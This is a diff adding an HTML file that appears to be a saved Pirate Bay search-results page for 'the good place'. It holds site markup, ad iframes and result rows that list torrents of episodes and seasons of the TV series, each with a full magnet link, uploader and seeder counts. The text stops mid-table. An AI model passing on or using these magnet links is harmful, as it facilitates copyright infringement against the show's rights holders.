@@ -1,0 +1,697 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>The Pirate Bay - The galaxy's most resilient bittorrent site</title>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
+    <link rel="search" type="application/opensearchdescription+xml" href="/opensearch.xml" title="Search The Pirate Bay" />
+    <link rel="stylesheet" type="text/css" href="//thepiratebay.org/static/css/pirate6.css"/>
+    <link rel="dns-prefetch" href="//syndication.exoclick.com/">
+    <link rel="dns-prefetch" href="//main.exoclick.com/">
+    <link rel="dns-prefetch" href="//static-ssl.exoclick.com/">
+    <link rel="dns-prefetch" href="//2468.go2cloud.org">
+    <link rel="dns-prefetch" href="//protect-your-privacy.net">
+    <link rel="dns-prefetch" href="//anonymous-net.com">
+    <link rel="dns-prefetch" href="//ads.exosrv.com">
+    <link rel="dns-prefetch" href="//s3.amazonaws.com">
+    <link rel="dns-prefetch" href="//traffic.adexprtz.com">
+    <link rel="canonical" href="//thepiratebay.org/search/the%20good%20place//0/7/0" />
+    <style type="text/css">
+        .searchBox{
+            margin: 6px;
+            width: 300px;
+            vertical-align: middle;
+            padding: 2px;
+            background-image:url('//thepiratebay.org/static/img/icon-https.gif');
+            background-repeat:no-repeat;
+            background-position: right;
+        }
+        .detLink {
+            font-size: 1.2em;
+            font-weight: 400;
+        }
+        .detDesc {
+            color: #4e5456;
+        }
+        .detDesc a:hover {
+            color: #000099;
+            text-decoration: underline;
+        }
+        .sortby {
+            text-align: left;
+            float: left;
+        }
+        .detName {
+            padding-top: 3px;
+            padding-bottom: 2px;
+        }
+        .viewswitch {
+            font-style: normal;
+            float: right;
+            text-align: right;
+            font-weight: normal;
+        }
+    </style>
+    <script src="//thepiratebay.org/static/js/jquery.min.js" type="text/javascript"></script>
+    <script src="//thepiratebay.org/static/js/tpb.js" type="text/javascript"></script>
+    <meta name="description" content="Search for and download any torrent from the pirate bay using search query the good place. Direct download via magnet link."/>
+    <meta name="keywords" content="the good place direct download torrent magnet tpb piratebay search"/>
+
+    <script language="javascript" type="text/javascript">if (top.location != self.location) {top.location.replace(self.location);}</script>
+</head>
+
+<body>
+    <div id="header">
+
+        <form method="get" id="q" action="/s/">
+            <a href="/" class="img"><img src="//thepiratebay.org/static/img/tpblogo_sm_ny.gif" id="TPBlogo" alt="The Pirate Bay" /></a>
+            <b><a href="/" title="Search Torrents">Search Torrents</a></b>&nbsp;&nbsp;|&nbsp;
+ <a href="/browse" title="Browse Torrents">Browse Torrents</a>&nbsp;&nbsp;|&nbsp;
+ <a href="/recent" title="Recent Torrent">Recent Torrents</a>&nbsp;&nbsp;|&nbsp;
+ <a href="/tv/" title="TV shows">TV shows</a>&nbsp;&nbsp;|&nbsp;
+ <a href="/music" title="Music">Music</a>&nbsp;&nbsp;|&nbsp;
+ <a href="/top" title="Top 100">Top 100</a>
+            <br /><input type="search" title="Pirate Search" name="q" required placeholder="Search here..." value="the good place" style="background-color:#ffffe0;" class="searchBox" /><input value="Pirate Search" type="submit" class="submitbutton"  />  <br />            <label for="audio" title="Audio"><input id="audio" name="audio" onclick="javascript:rmAll();" type="checkbox"/>Audio</label>
+            <label for="video" title="Video"><input id="video" name="video" onclick="javascript:rmAll();" type="checkbox"/>Video</label>
+            <label for="apps" title="Applications"><input id="apps" name="apps" onclick="javascript:rmAll();" type="checkbox"/>Applications</label>
+            <label for="games" title="Games"><input id="games" name="games" onclick="javascript:rmAll();" type="checkbox"/>Games</label>
+            <label for="porn" title="Porn"><input id="porn" name="porn" onclick="javascript:rmAll();" type="checkbox"/>Porn</label>
+            <label for="other" title="Other"><input id="other" name="other" onclick="javascript:rmAll();" type="checkbox"/>Other</label>
+
+            <select id="category" name="category" onchange="javascript:setAll();">
+                <option value="0">All</option>
+                <optgroup label="Audio">
+                    <option value="101">Music</option>
+                    <option value="102">Audio books</option>
+                    <option value="103">Sound clips</option>
+                    <option value="104">FLAC</option>
+                    <option value="199">Other</option>
+                </optgroup>
+                <optgroup label="Video">
+                    <option value="201">Movies</option>
+                    <option value="202">Movies DVDR</option>
+                    <option value="203">Music videos</option>
+                    <option value="204">Movie clips</option>
+                    <option value="205">TV shows</option>
+                    <option value="206">Handheld</option>
+                    <option value="207">HD - Movies</option>
+                    <option value="208">HD - TV shows</option>
+                    <option value="209">3D</option>
+                    <option value="299">Other</option>
+                </optgroup>
+                <optgroup label="Applications">
+                    <option value="301">Windows</option>
+                    <option value="302">Mac</option>
+                    <option value="303">UNIX</option>
+                    <option value="304">Handheld</option>
+                    <option value="305">IOS (iPad/iPhone)</option>
+                    <option value="306">Android</option>
+                    <option value="399">Other OS</option>
+                </optgroup>
+                <optgroup label="Games">
+                    <option value="401">PC</option>
+                    <option value="402">Mac</option>
+                    <option value="403">PSx</option>
+                    <option value="404">XBOX360</option>
+                    <option value="405">Wii</option>
+                    <option value="406">Handheld</option>
+                    <option value="407">IOS (iPad/iPhone)</option>
+                    <option value="408">Android</option>
+                    <option value="499">Other</option>
+                </optgroup>
+                <optgroup label="Porn">
+                    <option value="501">Movies</option>
+                    <option value="502">Movies DVDR</option>
+                    <option value="503">Pictures</option>
+                    <option value="504">Games</option>
+                    <option value="505">HD - Movies</option>
+                    <option value="506">Movie clips</option>
+                    <option value="599">Other</option>
+                </optgroup>
+                <optgroup label="Other">
+                    <option value="601">E-books</option>
+                    <option value="602">Comics</option>
+                    <option value="603">Pictures</option>
+                    <option value="604">Covers</option>
+                    <option value="605">Physibles</option>
+                    <option value="699">Other</option>
+                </optgroup>
+            </select>
+
+            <input type="hidden" name="page" value="0" />
+            <input type="hidden" name="orderby" value="99" />
+        </form>
+    </div><!-- // div:header -->
+
+    <h2><span>Search results: the good place</span>&nbsp;Displaying hits from 0 to 30 (approx 601 found)</h2>
+<div id="SearchResults"><div id="content">
+			<div id="sky-right">
+				 <iframe src="//thepiratebay.org/static/si0Eim0u/exo_na/sky2.html" width="160" height="600" frameborder="0" scrolling="no"></iframe>
+			</div>
+	
+			 <iframe src="//thepiratebay.org/static/si0Eim0u/exo_na/center.html" id="sky-center" width="728" height="90" frameborder="0" scrolling="no"></iframe>
+		<div id="main-content">
+<table id="searchResult">
+	<thead id="tableHead">
+		<tr class="header">
+			<th><a href="/search/the%20good%20place/0/13/7" title="Order by Type">Type</a></th>
+			<th><div class="sortby"><a href="/search/the%20good%20place/0/1/7" title="Order by Name">Name</a> (Order by: <a href="/search/the%20good%20place/0/3/7" title="Order by Uploaded">Uploaded</a>, <a href="/search/the%20good%20place/0/5/7" title="Order by Size">Size</a>, <span style="white-space: nowrap;"><a href="/search/the%20good%20place/0/11/7" title="Order by ULed by">ULed by</a></span>, <a href="/search/the%20good%20place/0/8/7" title="Order by Seeders">SE</a>, <a href="/search/the%20good%20place/0/9/7" title="Order by Leechers">LE</a>)</div><div class="viewswitch"> View: <a href="/switchview.php?view=s">Single</a> / Double&nbsp;</div></th>
+			<th><abbr title="Seeders"><a href="/search/the%20good%20place/0/8/7" title="Order by Seeders">SE</a></abbr></th>
+			<th><abbr title="Leechers"><a href="/search/the%20good%20place/0/9/7" title="Order by Leechers">LE</a></abbr></th>
+		</tr>
+	</thead>
+	<tr>
+		<td class="vertTh">
+			<center>
+				<a href="/browse/200" title="More from this category">Video</a><br />
+				(<a href="/browse/205" title="More from this category">TV shows</a>)
+			</center>
+		</td>
+		<td>
+<div class="detName">			<a href="/torrent/35047753/The.Good.Place.S04E09.HDTV.x264-SVA[ettv]" class="detLink" title="Details for The.Good.Place.S04E09.HDTV.x264-SVA[ettv]">The.Good.Place.S04E09.HDTV.x264-SVA[ettv]</a>
+</div>
+<a href="magnet:?xt=urn:btih:0be211f52baa81da5345a81812d82532be427b02&dn=The.Good.Place.S04E09.HDTV.x264-SVA%5Bettv%5D&tr=udp%3A%2F%2Ftracker.leechers-paradise.org%3A6969&tr=udp%3A%2F%2Ftracker.openbittorrent.com%3A80&tr=udp%3A%2F%2Fopen.demonii.com%3A1337&tr=udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969&tr=udp%3A%2F%2Fexodus.desync.com%3A6969" title="Download this torrent using magnet"><img src="//thepiratebay.org/static/img/icon-magnet.gif" alt="Magnet link" /></a><a href="/stream/35047753/" title="Play now using Baystream"><img src="//thepiratebay.org/static/img/icons/icon-bs.png" alt="Play link" /></a><a href="/user/ettv"><img src="//thepiratebay.org/static/img/vip.gif" alt="VIP" title="VIP" style="width:11px;" border='0' /></a><img src="//thepiratebay.org/static/img/11x11p.png" />
+			<font class="detDesc">Uploaded 11-22&nbsp;03:33, Size 133.07&nbsp;MiB, ULed by <a class="detDesc" href="/user/ettv/" title="Browse ettv">ettv</a></font>
+		</td>
+		<td align="right">190</td>
+		<td align="right">29</td>
+	</tr>
+	<tr class="alt">
+		<td class="vertTh">
+			<center>
+				<a href="/browse/200" title="More from this category">Video</a><br />
+				(<a href="/browse/205" title="More from this category">TV shows</a>)
+			</center>
+		</td>
+		<td>
+<div class="detName">			<a href="/torrent/34970499/The.Good.Place.S04E07.HDTV.x264-SVA[ettv]" class="detLink" title="Details for The.Good.Place.S04E07.HDTV.x264-SVA[ettv]">The.Good.Place.S04E07.HDTV.x264-SVA[ettv]</a>
+</div>
+<a href="magnet:?xt=urn:btih:e1d6957a3ac749603ca179572cc8fbd0f43fc4fd&dn=The.Good.Place.S04E07.HDTV.x264-SVA%5Bettv%5D&tr=udp%3A%2F%2Ftracker.leechers-paradise.org%3A6969&tr=udp%3A%2F%2Ftracker.openbittorrent.com%3A80&tr=udp%3A%2F%2Fopen.demonii.com%3A1337&tr=udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969&tr=udp%3A%2F%2Fexodus.desync.com%3A6969" title="Download this torrent using magnet"><img src="//thepiratebay.org/static/img/icon-magnet.gif" alt="Magnet link" /></a><a href="/stream/34970499/" title="Play now using Baystream"><img src="//thepiratebay.org/static/img/icons/icon-bs.png" alt="Play link" /></a><a href="/user/ettv"><img src="//thepiratebay.org/static/img/vip.gif" alt="VIP" title="VIP" style="width:11px;" border='0' /></a><img src="//thepiratebay.org/static/img/11x11p.png" />
+			<font class="detDesc">Uploaded 11-08&nbsp;03:38, Size 139.62&nbsp;MiB, ULed by <a class="detDesc" href="/user/ettv/" title="Browse ettv">ettv</a></font>
+		</td>
+		<td align="right">145</td>
+		<td align="right">16</td>
+	</tr>
+	<tr>
+		<td class="vertTh">
+			<center>
+				<a href="/browse/200" title="More from this category">Video</a><br />
+				(<a href="/browse/205" title="More from this category">TV shows</a>)
+			</center>
+		</td>
+		<td>
+<div class="detName">			<a href="/torrent/34951863/The.Good.Place.S04E06.HDTV.x264-SVA[ettv]" class="detLink" title="Details for The.Good.Place.S04E06.HDTV.x264-SVA[ettv]">The.Good.Place.S04E06.HDTV.x264-SVA[ettv]</a>
+</div>
+<a href="magnet:?xt=urn:btih:37c7f182aae127354c729f63ecddedfd19f8c98d&dn=The.Good.Place.S04E06.HDTV.x264-SVA%5Bettv%5D&tr=udp%3A%2F%2Ftracker.leechers-paradise.org%3A6969&tr=udp%3A%2F%2Ftracker.openbittorrent.com%3A80&tr=udp%3A%2F%2Fopen.demonii.com%3A1337&tr=udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969&tr=udp%3A%2F%2Fexodus.desync.com%3A6969" title="Download this torrent using magnet"><img src="//thepiratebay.org/static/img/icon-magnet.gif" alt="Magnet link" /></a><a href="/stream/34951863/" title="Play now using Baystream"><img src="//thepiratebay.org/static/img/icons/icon-bs.png" alt="Play link" /></a><a href="/user/ettv"><img src="//thepiratebay.org/static/img/vip.gif" alt="VIP" title="VIP" style="width:11px;" border='0' /></a><img src="//thepiratebay.org/static/img/11x11p.png" />
+			<font class="detDesc">Uploaded 11-01&nbsp;02:40, Size 160.59&nbsp;MiB, ULed by <a class="detDesc" href="/user/ettv/" title="Browse ettv">ettv</a></font>
+		</td>
+		<td align="right">142</td>
+		<td align="right">16</td>
+	</tr>
+	<tr class="alt">
+		<td class="vertTh">
+			<center>
+				<a href="/browse/200" title="More from this category">Video</a><br />
+				(<a href="/browse/205" title="More from this category">TV shows</a>)
+			</center>
+		</td>
+		<td>
+<div class="detName">			<a href="/torrent/35000996/The.Good.Place.S04E08.HDTV.x264-SVA[ettv]" class="detLink" title="Details for The.Good.Place.S04E08.HDTV.x264-SVA[ettv]">The.Good.Place.S04E08.HDTV.x264-SVA[ettv]</a>
+</div>
+<a href="magnet:?xt=urn:btih:618d45fb07b37e700d3e9653f017dc7f40c4174b&dn=The.Good.Place.S04E08.HDTV.x264-SVA%5Bettv%5D&tr=udp%3A%2F%2Ftracker.leechers-paradise.org%3A6969&tr=udp%3A%2F%2Ftracker.openbittorrent.com%3A80&tr=udp%3A%2F%2Fopen.demonii.com%3A1337&tr=udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969&tr=udp%3A%2F%2Fexodus.desync.com%3A6969" title="Download this torrent using magnet"><img src="//thepiratebay.org/static/img/icon-magnet.gif" alt="Magnet link" /></a><a href="/stream/35000996/" title="Play now using Baystream"><img src="//thepiratebay.org/static/img/icons/icon-bs.png" alt="Play link" /></a><a href="/user/ettv"><img src="//thepiratebay.org/static/img/vip.gif" alt="VIP" title="VIP" style="width:11px;" border='0' /></a><img src="//thepiratebay.org/static/img/11x11p.png" />
+			<font class="detDesc">Uploaded 11-15&nbsp;03:36, Size 144.62&nbsp;MiB, ULed by <a class="detDesc" href="/user/ettv/" title="Browse ettv">ettv</a></font>
+		</td>
+		<td align="right">141</td>
+		<td align="right">19</td>
+	</tr>
+	<tr>
+		<td class="vertTh">
+			<center>
+				<a href="/browse/200" title="More from this category">Video</a><br />
+				(<a href="/browse/205" title="More from this category">TV shows</a>)
+			</center>
+		</td>
+		<td>
+<div class="detName">			<a href="/torrent/34845584/The.Good.Place.S04E03.HDTV.x264-PHOENiX[TGx]" class="detLink" title="Details for The.Good.Place.S04E03.HDTV.x264-PHOENiX[TGx]">The.Good.Place.S04E03.HDTV.x264-PHOENiX[TGx]</a>
+</div>
+<a href="magnet:?xt=urn:btih:8481c44c2c034ae74bb6c5c80dedfe6e116fc268&dn=The.Good.Place.S04E03.HDTV.x264-PHOENiX%5BTGx%5D&tr=udp%3A%2F%2Ftracker.leechers-paradise.org%3A6969&tr=udp%3A%2F%2Ftracker.openbittorrent.com%3A80&tr=udp%3A%2F%2Fopen.demonii.com%3A1337&tr=udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969&tr=udp%3A%2F%2Fexodus.desync.com%3A6969" title="Download this torrent using magnet"><img src="//thepiratebay.org/static/img/icon-magnet.gif" alt="Magnet link" /></a><a href="/stream/34845584/" title="Play now using Baystream"><img src="//thepiratebay.org/static/img/icons/icon-bs.png" alt="Play link" /></a><a href="/user/sotnikam"><img src="//thepiratebay.org/static/img/trusted.png" alt="Trusted" title="Trusted" style="width:11px;" border='0' /></a><img src="//thepiratebay.org/static/img/11x11p.png" />
+			<font class="detDesc">Uploaded 10-11&nbsp;03:45, Size 184.02&nbsp;MiB, ULed by <a class="detDesc" href="/user/sotnikam/" title="Browse sotnikam">sotnikam</a></font>
+		</td>
+		<td align="right">134</td>
+		<td align="right">23</td>
+	</tr>
+	<tr class="alt">
+		<td class="vertTh">
+			<center>
+				<a href="/browse/200" title="More from this category">Video</a><br />
+				(<a href="/browse/205" title="More from this category">TV shows</a>)
+			</center>
+		</td>
+		<td>
+<div class="detName">			<a href="/torrent/34738815/The.Good.Place.S04E01.HDTV.x264-SVA[ettv]" class="detLink" title="Details for The.Good.Place.S04E01.HDTV.x264-SVA[ettv]">The.Good.Place.S04E01.HDTV.x264-SVA[ettv]</a>
+</div>
+<a href="magnet:?xt=urn:btih:76d8c9822f4bac30ec6406bdbfd4892c99bdbf7a&dn=The.Good.Place.S04E01.HDTV.x264-SVA%5Bettv%5D&tr=udp%3A%2F%2Ftracker.leechers-paradise.org%3A6969&tr=udp%3A%2F%2Ftracker.openbittorrent.com%3A80&tr=udp%3A%2F%2Fopen.demonii.com%3A1337&tr=udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969&tr=udp%3A%2F%2Fexodus.desync.com%3A6969" title="Download this torrent using magnet"><img src="//thepiratebay.org/static/img/icon-magnet.gif" alt="Magnet link" /></a><a href="/stream/34738815/" title="Play now using Baystream"><img src="//thepiratebay.org/static/img/icons/icon-bs.png" alt="Play link" /></a><a href="/user/ettv"><img src="//thepiratebay.org/static/img/vip.gif" alt="VIP" title="VIP" style="width:11px;" border='0' /></a><img src="//thepiratebay.org/static/img/11x11p.png" />
+			<font class="detDesc">Uploaded 09-27&nbsp;03:33, Size 158.73&nbsp;MiB, ULed by <a class="detDesc" href="/user/ettv/" title="Browse ettv">ettv</a></font>
+		</td>
+		<td align="right">120</td>
+		<td align="right">13</td>
+	</tr>
+	<tr>
+		<td class="vertTh">
+			<center>
+				<a href="/browse/200" title="More from this category">Video</a><br />
+				(<a href="/browse/208" title="More from this category">HD - TV shows</a>)
+			</center>
+		</td>
+		<td>
+<div class="detName">			<a href="/torrent/16956542/The_Good_Place_Season_1_Full_720p_Web-DL_EN-Sub_x264-[MULVAcoded" class="detLink" title="Details for The Good Place Season 1 Full 720p Web-DL EN-Sub x264-[MULVAcoded">The Good Place Season 1 Full 720p Web-DL EN-Sub x264-[MULVAcoded</a>
+</div>
+<a href="magnet:?xt=urn:btih:d1353d51aa45a9402bc69a39df60d3d6bccabf74&dn=The+Good+Place+Season+1+Full+720p+Web-DL+EN-Sub+x264-%5BMULVAcoded&tr=udp%3A%2F%2Ftracker.leechers-paradise.org%3A6969&tr=udp%3A%2F%2Ftracker.openbittorrent.com%3A80&tr=udp%3A%2F%2Fopen.demonii.com%3A1337&tr=udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969&tr=udp%3A%2F%2Fexodus.desync.com%3A6969" title="Download this torrent using magnet"><img src="//thepiratebay.org/static/img/icon-magnet.gif" alt="Magnet link" /></a><a href="/stream/16956542/" title="Play now using Baystream"><img src="//thepiratebay.org/static/img/icons/icon-bs.png" alt="Play link" /></a><img src="//thepiratebay.org/static/img/icon_comment.gif" alt="This torrent has 2 comments." title="This torrent has 2 comments." /><a href="/user/Mulva1989"><img src="//thepiratebay.org/static/img/vip.gif" alt="VIP" title="VIP" style="width:11px;" border='0' /></a>
+			<font class="detDesc">Uploaded 01-29&nbsp;2017, Size 2.05&nbsp;GiB, ULed by <a class="detDesc" href="/user/Mulva1989/" title="Browse Mulva1989">Mulva1989</a></font>
+		</td>
+		<td align="right">116</td>
+		<td align="right">52</td>
+	</tr>
+	<tr class="alt">
+		<td class="vertTh">
+			<center>
+				<a href="/browse/200" title="More from this category">Video</a><br />
+				(<a href="/browse/208" title="More from this category">HD - TV shows</a>)
+			</center>
+		</td>
+		<td>
+<div class="detName">			<a href="/torrent/34796036/The.Good.Place.S04E02.720p.HDTV.x265-MiNX[TGx]" class="detLink" title="Details for The.Good.Place.S04E02.720p.HDTV.x265-MiNX[TGx]">The.Good.Place.S04E02.720p.HDTV.x265-MiNX[TGx]</a>
+</div>
+<a href="magnet:?xt=urn:btih:13048e8b5f499062d5f804bc1e2b474ec4e557ed&dn=The.Good.Place.S04E02.720p.HDTV.x265-MiNX%5BTGx%5D&tr=udp%3A%2F%2Ftracker.leechers-paradise.org%3A6969&tr=udp%3A%2F%2Ftracker.openbittorrent.com%3A80&tr=udp%3A%2F%2Fopen.demonii.com%3A1337&tr=udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969&tr=udp%3A%2F%2Fexodus.desync.com%3A6969" title="Download this torrent using magnet"><img src="//thepiratebay.org/static/img/icon-magnet.gif" alt="Magnet link" /></a><a href="/stream/34796036/" title="Play now using Baystream"><img src="//thepiratebay.org/static/img/icons/icon-bs.png" alt="Play link" /></a><a href="/user/sotnikam"><img src="//thepiratebay.org/static/img/trusted.png" alt="Trusted" title="Trusted" style="width:11px;" border='0' /></a><img src="//thepiratebay.org/static/img/11x11p.png" />
+			<font class="detDesc">Uploaded 10-04&nbsp;05:49, Size 115.18&nbsp;MiB, ULed by <a class="detDesc" href="/user/sotnikam/" title="Browse sotnikam">sotnikam</a></font>
+		</td>
+		<td align="right">111</td>
+		<td align="right">21</td>
+	</tr>
+	<tr>
+		<td class="vertTh">
+			<center>
+				<a href="/browse/200" title="More from this category">Video</a><br />
+				(<a href="/browse/208" title="More from this category">HD - TV shows</a>)
+			</center>
+		</td>
+		<td>
+<div class="detName">			<a href="/torrent/30048186/The_Good_Place_-_Season_3_(Complete)_-_Mp4_x264_AC3_1080p" class="detLink" title="Details for The Good Place - Season 3 (Complete) - Mp4 x264 AC3 1080p">The Good Place - Season 3 (Complete) - Mp4 x264 AC3 1080p</a>
+</div>
+<a href="magnet:?xt=urn:btih:6fc2bfb0496eb7f658929fff4bbc4a7359595c07&dn=The+Good+Place+-+Season+3+%28Complete%29+-+Mp4+x264+AC3+1080p&tr=udp%3A%2F%2Ftracker.leechers-paradise.org%3A6969&tr=udp%3A%2F%2Ftracker.openbittorrent.com%3A80&tr=udp%3A%2F%2Fopen.demonii.com%3A1337&tr=udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969&tr=udp%3A%2F%2Fexodus.desync.com%3A6969" title="Download this torrent using magnet"><img src="//thepiratebay.org/static/img/icon-magnet.gif" alt="Magnet link" /></a><img src="//thepiratebay.org/static/img/icon_comment.gif" alt="This torrent has 2 comments." title="This torrent has 2 comments." /><a href="/user/Truth4U"><img src="//thepiratebay.org/static/img/vip.gif" alt="VIP" title="VIP" style="width:11px;" border='0' /></a>
+			<font class="detDesc">Uploaded 02-18&nbsp;09:47, Size 8.2&nbsp;GiB, ULed by <a class="detDesc" href="/user/Truth4U/" title="Browse Truth4U">Truth4U</a></font>
+		</td>
+		<td align="right">98</td>
+		<td align="right">30</td>
+	</tr>
+	<tr class="alt">
+		<td class="vertTh">
+			<center>
+				<a href="/browse/200" title="More from this category">Video</a><br />
+				(<a href="/browse/205" title="More from this category">TV shows</a>)
+			</center>
+		</td>
+		<td>
+<div class="detName">			<a href="/torrent/34889715/The.Good.Place.S04E04.HDTV.x264-SVA[ettv]" class="detLink" title="Details for The.Good.Place.S04E04.HDTV.x264-SVA[ettv]">The.Good.Place.S04E04.HDTV.x264-SVA[ettv]</a>
+</div>
+<a href="magnet:?xt=urn:btih:d8539460b54c1c25b8a5ad56bbaaf4e1d3d72dae&dn=The.Good.Place.S04E04.HDTV.x264-SVA%5Bettv%5D&tr=udp%3A%2F%2Ftracker.leechers-paradise.org%3A6969&tr=udp%3A%2F%2Ftracker.openbittorrent.com%3A80&tr=udp%3A%2F%2Fopen.demonii.com%3A1337&tr=udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969&tr=udp%3A%2F%2Fexodus.desync.com%3A6969" title="Download this torrent using magnet"><img src="//thepiratebay.org/static/img/icon-magnet.gif" alt="Magnet link" /></a><a href="/stream/34889715/" title="Play now using Baystream"><img src="//thepiratebay.org/static/img/icons/icon-bs.png" alt="Play link" /></a><a href="/user/ettv"><img src="//thepiratebay.org/static/img/vip.gif" alt="VIP" title="VIP" style="width:11px;" border='0' /></a><img src="//thepiratebay.org/static/img/11x11p.png" />
+			<font class="detDesc">Uploaded 10-18&nbsp;03:33, Size 123.92&nbsp;MiB, ULed by <a class="detDesc" href="/user/ettv/" title="Browse ettv">ettv</a></font>
+		</td>
+		<td align="right">96</td>
+		<td align="right">12</td>
+	</tr>
+	<tr>
+		<td class="vertTh">
+			<center>
+				<a href="/browse/200" title="More from this category">Video</a><br />
+				(<a href="/browse/208" title="More from this category">HD - TV shows</a>)
+			</center>
+		</td>
+		<td>
+<div class="detName">			<a href="/torrent/34924073/The.Good.Place.S04E05.1080p.WEB.X264-METCON[TGx]" class="detLink" title="Details for The.Good.Place.S04E05.1080p.WEB.X264-METCON[TGx]">The.Good.Place.S04E05.1080p.WEB.X264-METCON[TGx]</a>
+</div>
+<a href="magnet:?xt=urn:btih:b0edd9687a31383c798436bb41c8c55c9c34634b&dn=The.Good.Place.S04E05.1080p.WEB.X264-METCON%5BTGx%5D&tr=udp%3A%2F%2Ftracker.leechers-paradise.org%3A6969&tr=udp%3A%2F%2Ftracker.openbittorrent.com%3A80&tr=udp%3A%2F%2Fopen.demonii.com%3A1337&tr=udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969&tr=udp%3A%2F%2Fexodus.desync.com%3A6969" title="Download this torrent using magnet"><img src="//thepiratebay.org/static/img/icon-magnet.gif" alt="Magnet link" /></a><a href="/stream/34924073/" title="Play now using Baystream"><img src="//thepiratebay.org/static/img/icons/icon-bs.png" alt="Play link" /></a><a href="/user/sotnikam"><img src="//thepiratebay.org/static/img/trusted.png" alt="Trusted" title="Trusted" style="width:11px;" border='0' /></a><img src="//thepiratebay.org/static/img/11x11p.png" />
+			<font class="detDesc">Uploaded 10-25&nbsp;09:07, Size 1013&nbsp;MiB, ULed by <a class="detDesc" href="/user/sotnikam/" title="Browse sotnikam">sotnikam</a></font>
+		</td>
+		<td align="right">85</td>
+		<td align="right">21</td>
+	</tr>
+	<tr class="alt">
+		<td class="vertTh">
+			<center>
+				<a href="/browse/200" title="More from this category">Video</a><br />
+				(<a href="/browse/205" title="More from this category">TV shows</a>)
+			</center>
+		</td>
+		<td>
+<div class="detName">			<a href="/torrent/19916538/The_Good_Place_Season_2" class="detLink" title="Details for The Good Place Season 2">The Good Place Season 2</a>
+</div>
+<a href="magnet:?xt=urn:btih:8111a7822320a6a65af6188514953a27caa77dba&dn=The+Good+Place+Season+2&tr=udp%3A%2F%2Ftracker.leechers-paradise.org%3A6969&tr=udp%3A%2F%2Ftracker.openbittorrent.com%3A80&tr=udp%3A%2F%2Fopen.demonii.com%3A1337&tr=udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969&tr=udp%3A%2F%2Fexodus.desync.com%3A6969" title="Download this torrent using magnet"><img src="//thepiratebay.org/static/img/icon-magnet.gif" alt="Magnet link" /></a><a href="/stream/19916538/" title="Play now using Baystream"><img src="//thepiratebay.org/static/img/icons/icon-bs.png" alt="Play link" /></a><img src="//thepiratebay.org/static/img/icon_comment.gif" alt="This torrent has 5 comments." title="This torrent has 5 comments." /><a href="/user/revittony1"><img src="//thepiratebay.org/static/img/trusted.png" alt="Trusted" title="Trusted" style="width:11px;" border='0' /></a>
+			<font class="detDesc">Uploaded 02-02&nbsp;2018, Size 1.94&nbsp;GiB, ULed by <a class="detDesc" href="/user/revittony1/" title="Browse revittony1">revittony1</a></font>
+		</td>
+		<td align="right">63</td>
+		<td align="right">14</td>
+	</tr>
+	<tr>
+		<td class="vertTh">
+			<center>
+				<a href="/browse/200" title="More from this category">Video</a><br />
+				(<a href="/browse/205" title="More from this category">TV shows</a>)
+			</center>
+		</td>
+		<td>
+<div class="detName">			<a href="/torrent/34796182/The.Good.Place.S04E02.HDTV.x264-KILLERS[ettv]" class="detLink" title="Details for The.Good.Place.S04E02.HDTV.x264-KILLERS[ettv]">The.Good.Place.S04E02.HDTV.x264-KILLERS[ettv]</a>
+</div>
+<a href="magnet:?xt=urn:btih:0e5f8c38e34b64c76e3088ce2f35143318faa4c1&dn=The.Good.Place.S04E02.HDTV.x264-KILLERS%5Bettv%5D&tr=udp%3A%2F%2Ftracker.leechers-paradise.org%3A6969&tr=udp%3A%2F%2Ftracker.openbittorrent.com%3A80&tr=udp%3A%2F%2Fopen.demonii.com%3A1337&tr=udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969&tr=udp%3A%2F%2Fexodus.desync.com%3A6969" title="Download this torrent using magnet"><img src="//thepiratebay.org/static/img/icon-magnet.gif" alt="Magnet link" /></a><a href="/stream/34796182/" title="Play now using Baystream"><img src="//thepiratebay.org/static/img/icons/icon-bs.png" alt="Play link" /></a><a href="/user/ettv"><img src="//thepiratebay.org/static/img/vip.gif" alt="VIP" title="VIP" style="width:11px;" border='0' /></a><img src="//thepiratebay.org/static/img/11x11p.png" />
+			<font class="detDesc">Uploaded 10-04&nbsp;06:39, Size 161.89&nbsp;MiB, ULed by <a class="detDesc" href="/user/ettv/" title="Browse ettv">ettv</a></font>
+		</td>
+		<td align="right">44</td>
+		<td align="right">7</td>
+	</tr>
+	<tr class="alt">
+		<td class="vertTh">
+			<center>
+				<a href="/browse/200" title="More from this category">Video</a><br />
+				(<a href="/browse/205" title="More from this category">TV shows</a>)
+			</center>
+		</td>
+		<td>
+<div class="detName">			<a href="/torrent/34923358/The.Good.Place.S04E05.HDTV.x264-SVA[TGx]" class="detLink" title="Details for The.Good.Place.S04E05.HDTV.x264-SVA[TGx]">The.Good.Place.S04E05.HDTV.x264-SVA[TGx]</a>
+</div>
+<a href="magnet:?xt=urn:btih:b36552f12b3707a4d5b3a92c9af81991e3a9b9ec&dn=The.Good.Place.S04E05.HDTV.x264-SVA%5BTGx%5D&tr=udp%3A%2F%2Ftracker.leechers-paradise.org%3A6969&tr=udp%3A%2F%2Ftracker.openbittorrent.com%3A80&tr=udp%3A%2F%2Fopen.demonii.com%3A1337&tr=udp%3A%2F%2Ftracker.coppersurfer.tk%3A6969&tr=udp%3A%2F%2Fexodus.desync.com%3A6969" title="Download this torrent using magnet"><img src="//thepiratebay.org/static/img/icon-magnet.gif" alt="Magnet link" /></a><a href="/stream/34923358/" title="Play now using Baystream"><img src="//thepiratebay.org/static/img/icons/icon-bs.png" alt="Play link" /></a><a href="/user/sotnikam"><img src="//thepiratebay.org/static/img/trusted.png" alt="Trusted" title="Trusted" style="width:11px;" border='0' /></a><img src="//thepiratebay.org/static/img/11x11p.png" />
+			<font class="detDesc">Uploaded 10-25&nbsp;03:36, Size 161.36&nbsp;MiB, ULed by <a class="detDesc" href="/user/sotnikam/" title="Browse sotnikam">sotnikam</a></font>
+		</td>
